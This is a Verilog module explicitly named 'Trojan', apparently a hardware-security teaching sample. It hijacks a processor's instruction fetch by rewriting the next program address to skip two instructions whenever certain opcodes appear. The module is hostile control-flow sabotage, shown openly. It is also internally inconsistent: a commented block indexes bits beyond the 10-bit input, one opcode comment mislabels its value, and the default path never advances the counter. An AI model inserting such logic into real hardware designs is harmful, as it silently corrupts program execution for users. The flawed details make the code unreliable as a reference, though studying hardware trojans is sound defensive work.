module Trojan (
    input wire pon_rst_n_i, //上電後的重置信號，低電平有效
    input wire [9:0] prog_dat_i, //當前正在送入處理器的指令資料 (instruction code)
    input wire [3:0] pc_reg, //目前正在執行的程式位址（PC）
    output wire [3:0] prog_adr_o //下一個要取的程式位址（可能由木馬竄改）
);

/*
wire match_condition = (!pon_rst_n_i) ? 1'b0 :
                       (prog_dat_i[13:10] == 4'b1101) ? 1'b0 :
                       ((prog_dat_i[13:10] == 4'b1000) || (prog_dat_i[13:10] == 4'b1001) ||
                        (prog_dat_i[13:10] == 4'b1010) || (prog_dat_i[13:10] == 4'b1011) ||
                        (prog_dat_i[13:10] == 4'b0100) || (prog_dat_i[13:10] == 4'b0101) ||
                        (prog_dat_i[13:10] == 4'b0110) || (prog_dat_i[13:10] == 4'b0111) ||
                        (prog_dat_i[13:10] == 4'b1100)) ? 1'b1 : 1'b0;
*/

wire match_condition = (!pon_rst_n_i) ? 1'b0 :
                       (prog_dat_i[7:4] == 4'b1001) ? 1'b0 :
                       ((prog_dat_i[7:4] == 4'b1101) ||  // 9
                        (prog_dat_i[7:4] == 4'b0110) ||  // 6
                        (prog_dat_i[7:4] == 4'b1010) ||  // A
                        (prog_dat_i[7:4] == 4'b1000) ||  // 8
                        (prog_dat_i[7:4] == 4'b1100) ||  // C
                        (prog_dat_i[7:4] == 4'b0101) ||  // 5
                        (prog_dat_i[7:4] == 4'b0111) ||  // 7
                        (prog_dat_i[7:4] == 4'b0100) ||  // 4
                        (prog_dat_i[7:4] == 4'b1011))    // B
                        ? 1'b1 : 1'b0;

assign prog_adr_o = match_condition ? pc_reg + 2 : pc_reg;

endmodule
